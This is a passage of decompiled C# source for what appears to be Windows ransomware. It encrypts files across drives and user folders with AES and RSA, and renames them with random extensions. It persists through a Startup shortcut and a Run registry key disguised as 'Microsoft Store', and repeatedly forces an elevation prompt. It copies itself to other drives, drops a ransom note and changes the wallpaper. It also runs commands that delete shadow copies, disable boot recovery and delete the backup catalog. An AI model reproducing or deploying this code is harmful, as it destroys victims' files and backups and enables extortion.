		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] array = null;
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		using MemoryStream memoryStream = new MemoryStream();
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
			cryptoStream.Close();
		}
		return memoryStream.ToArray();
	}

	public static void EncryptFile(string file)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
		string text = CreatePassword(20);
		byte[] bytes = Encoding.UTF8.GetBytes(text);
		byte[] inArray = AES_Encrypt(bytesToBeEncrypted, bytes);
		File.WriteAllText(file, "<EncryptedKey>" + RSAEncrypt(text, rsaKey()) + "<EncryptedKey>" + Convert.ToBase64String(inArray));
		File.Move(file, file + "." + RandomStringForExtension(4));
	}

	public static string RSAEncrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(1024);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\")
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
		string location = userDir + userName + "\\Desktop";
		string location2 = userDir + userName + "\\Links";
		string location3 = userDir + userName + "\\Contacts";
		string location4 = userDir + userName + "\\Desktop";
		string location5 = userDir + userName + "\\Documents";
		string location6 = userDir + userName + "\\Downloads";
		string location7 = userDir + userName + "\\Pictures";
		string location8 = userDir + userName + "\\Music";
		string location9 = userDir + userName + "\\OneDrive";
		string location10 = userDir + userName + "\\Saved Games";
		string location11 = userDir + userName + "\\Favorites";
		string location12 = userDir + userName + "\\Searches";
		string location13 = userDir + userName + "\\Videos";
		encryptDirectory(location);
		encryptDirectory(location2);
		encryptDirectory(location3);
		encryptDirectory(location4);
		encryptDirectory(location5);
		encryptDirectory(location6);
		encryptDirectory(location7);
		encryptDirectory(location8);
		encryptDirectory(location9);
		encryptDirectory(location10);
		encryptDirectory(location11);
		encryptDirectory(location12);
		encryptDirectory(location13);
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDocuments));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonMusic));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonVideos));
		encryptDirectory(Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory));
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			File.WriteAllLines(text, messages);
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
